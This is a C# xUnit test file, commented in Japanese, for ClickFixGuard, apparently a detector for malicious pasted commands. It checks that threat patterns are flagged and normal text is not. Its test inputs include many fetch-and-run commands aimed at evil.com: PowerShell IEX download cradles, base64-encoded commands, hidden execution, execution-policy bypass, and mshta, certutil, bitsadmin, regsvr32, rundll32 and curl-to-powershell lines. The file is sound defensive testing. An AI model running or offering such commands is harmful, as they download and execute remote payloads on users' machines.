using ClickFixGuard;
using Xunit;

namespace ClickFixGuard.Tests;

/// <summary>
/// ThreatPatterns.Analyze() のデータ駆動テスト。
/// パターン追加時に既存検知が壊れないことを保証する。
/// </summary>
public class ThreatPatternsTests
{
    // === Critical: 確実に検知されるべきパターン ===

    [Theory]
    [InlineData("powershell IEX(Invoke-WebRequest 'https://evil.com/payload.ps1')", "PowerShell IEX")]
    [InlineData("powershell -WindowStyle Hidden IEX(IWR 'https://evil.com/p.ps1')", "PowerShell IEX")]
    [InlineData("powershell Invoke-Expression(Invoke-WebRequest 'https://evil.com')", "PowerShell IEX")]
    [InlineData("powershell IEX (New-Object Net.WebClient).DownloadString('https://evil.com')", "PowerShell IEX")]
    public void Critical_PowerShell_IEX(string input, string expectedCategory)
    {
        var result = ThreatPatterns.Analyze(input);
        Assert.NotNull(result);
        Assert.Equal(ThreatPatterns.ThreatLevel.Critical, result.Level);
        Assert.Equal(expectedCategory, result.Category);
    }

    [Theory]
    [InlineData("powershell Invoke-WebRequest 'https://evil.com/mal.exe' -OutFile mal.exe")]
    [InlineData("powershell IWR https://evil.com/payload.ps1")]
    [InlineData("powershell Invoke-RestMethod -Uri https://evil.com/api")]
    public void Critical_PowerShell_Download(string input)
    {
        var result = ThreatPatterns.Analyze(input);
        Assert.NotNull(result);
        Assert.Equal(ThreatPatterns.ThreatLevel.Critical, result.Level);
    }

    [Theory]
    [InlineData("powershell -enc SQBFAFgAKABJAFcAUgAgACcAaAB0AHQAcAA=")]
    [InlineData("powershell -EncodedCommand SQBFAFgAKABJAFcAUgAgACcAaAB0AHQAcAA=")]
    [InlineData("powershell -e SQBFAFgAKABJAFcAUgAgACcAaAB0AHQAcABzADoALwAvAGUAdgBpAGwALgBjAG8AbQAvAHMAaABlAGwAbAAnACkA")]
    public void Critical_PowerShell_Base64(string input)
    {
        var result = ThreatPatterns.Analyze(input);
        Assert.NotNull(result);
        Assert.Equal(ThreatPatterns.ThreatLevel.Critical, result.Level);
        Assert.Equal("PowerShell Encoded", result.Category);
    }

    [Theory]
    [InlineData("powershell -WindowStyle Hidden -NoProfile some-command", "Hidden Execution")]
    [InlineData("powershell -W Hidden IEX(something)", "Hidden Execution")]
    public void Critical_Hidden_Execution(string input, string _)
    {
        var result = ThreatPatterns.Analyze(input);
        Assert.NotNull(result);
        Assert.Equal(ThreatPatterns.ThreatLevel.Critical, result.Level);
    }

    [Theory]
    [InlineData("mshta https://evil.com/payload.hta", "MSHTA Remote")]
    [InlineData("mshta http://192.168.1.1/app.hta", "MSHTA Remote")]
    public void Critical_MSHTA(string input, string expectedCategory)
    {
        var result = ThreatPatterns.Analyze(input);
        Assert.NotNull(result);
        Assert.Equal(ThreatPatterns.ThreatLevel.Critical, result.Level);
        Assert.Equal(expectedCategory, result.Category);
    }

    [Theory]
    [InlineData("bitsadmin /transfer job /download https://evil.com/mal.exe C:\\temp\\mal.exe")]
    [InlineData("certutil -urlcache -split -f https://evil.com/payload.exe")]
    [InlineData("certutil -decode encoded.txt payload.exe")]
    [InlineData("curl https://evil.com/script.ps1 | powershell")]
    [InlineData("regsvr32 /s /i:https://evil.com/payload.sct scrobj.dll")]
    [InlineData("rundll32 https://evil.com/payload.dll,EntryPoint")]
    [InlineData("wscript https://evil.com/payload.vbs")]
    [InlineData("cscript https://evil.com/payload.js")]
    [InlineData("msiexec /i https://evil.com/payload.msi")]
    public void Critical_LOLBins(string input)
    {
        var result = ThreatPatterns.Analyze(input);
        Assert.NotNull(result);
        Assert.Equal(ThreatPatterns.ThreatLevel.Critical, result.Level);
    }

    [Theory]
    [InlineData("nslookup payload.evil.com | powershell", "DNS Payload")]
    [InlineData("finger user@evil.com", "Finger.exe Abuse")]
    public void Critical_2026_Variants(string input, string expectedCategory)
    {
        var result = ThreatPatterns.Analyze(input);
        Assert.NotNull(result);
        Assert.Equal(ThreatPatterns.ThreatLevel.Critical, result.Level);
        Assert.Equal(expectedCategory, result.Category);
    }

    [Fact]
    public void Critical_PowerShell_StartProcess()
    {
        var result = ThreatPatterns.Analyze("powershell Start-Process notepad.exe");
        Assert.NotNull(result);
        Assert.Equal(ThreatPatterns.ThreatLevel.Critical, result.Level);
        Assert.Equal("PowerShell Exec", result.Category);
    }

    [Fact]
    public void Critical_PowerShell_DownloadFile()
    {
        var result = ThreatPatterns.Analyze("powershell (New-Object Net.WebClient).DownloadFile('https://evil.com/mal.exe','C:\\temp\\mal.exe')");
        Assert.NotNull(result);
        Assert.Equal(ThreatPatterns.ThreatLevel.Critical, result.Level);
    }

    // === Suspicious: 注意レベルで検知されるべきパターン ===

    [Theory]
    [InlineData("powershell", "PowerShell")]
    [InlineData("pwsh", "PowerShell Core")]
    [InlineData("cmd /c echo hello", "CMD Execute")]
    public void Suspicious_ShellLaunch(string input, string expectedCategory)
    {
        var result = ThreatPatterns.Analyze(input);
        Assert.NotNull(result);
        Assert.Equal(ThreatPatterns.ThreatLevel.Suspicious, result.Level);
        Assert.Equal(expectedCategory, result.Category);
    }

    [Theory]
    [InlineData("-ExecutionPolicy Bypass", "Policy Bypass")]
    [InlineData("-ep bypass", "Policy Bypass")]
    public void Suspicious_PolicyBypass(string input, string _)
    {
        var result = ThreatPatterns.Analyze(input);
        Assert.NotNull(result);
        Assert.Equal(ThreatPatterns.ThreatLevel.Suspicious, result.Level);
    }

    [Fact]
    public void Suspicious_ExecutableUrl()
    {
        var result = ThreatPatterns.Analyze("https://example.com/setup.exe");
        Assert.NotNull(result);
        Assert.Equal(ThreatPatterns.ThreatLevel.Suspicious, result.Level);
        Assert.Equal("Executable URL", result.Category);
    }

    // === Safe: 検知されてはいけないパターン ===

    [Theory]
    [InlineData("Hello, this is just normal text.")]
    [InlineData("meeting at 3pm tomorrow")]
    [InlineData("https://www.google.com")]
    [InlineData("The quick brown fox jumps over the lazy dog")]
    [InlineData("SELECT * FROM users WHERE id = 1")]
    [InlineData("git commit -m 'fix bug'")]
    [InlineData("npm install express")]
    [InlineData("")]
    [InlineData("   ")]
    public void Safe_NormalText(string input)
    {
        var result = ThreatPatterns.Analyze(input);
        Assert.Null(result);
    }

    // === MatchedFragment が適切に抽出される ===

    [Fact]
    public void MatchedFragment_IsNotEmpty()
    {
        var result = ThreatPatterns.Analyze("powershell IEX(IWR 'https://evil.com')");
        Assert.NotNull(result);
        Assert.False(string.IsNullOrWhiteSpace(result.MatchedFragment));
    }

    [Fact]
    public void MatchedFragment_TruncatesLongInput()
    {
        var longCommand = "powershell IEX(" + new string('A', 500) + ")";
        var result = ThreatPatterns.Analyze(longCommand);
        Assert.NotNull(result);
        // Fragment should be shorter than the full input
        Assert.True(result.MatchedFragment.Length < longCommand.Length);
    }
}
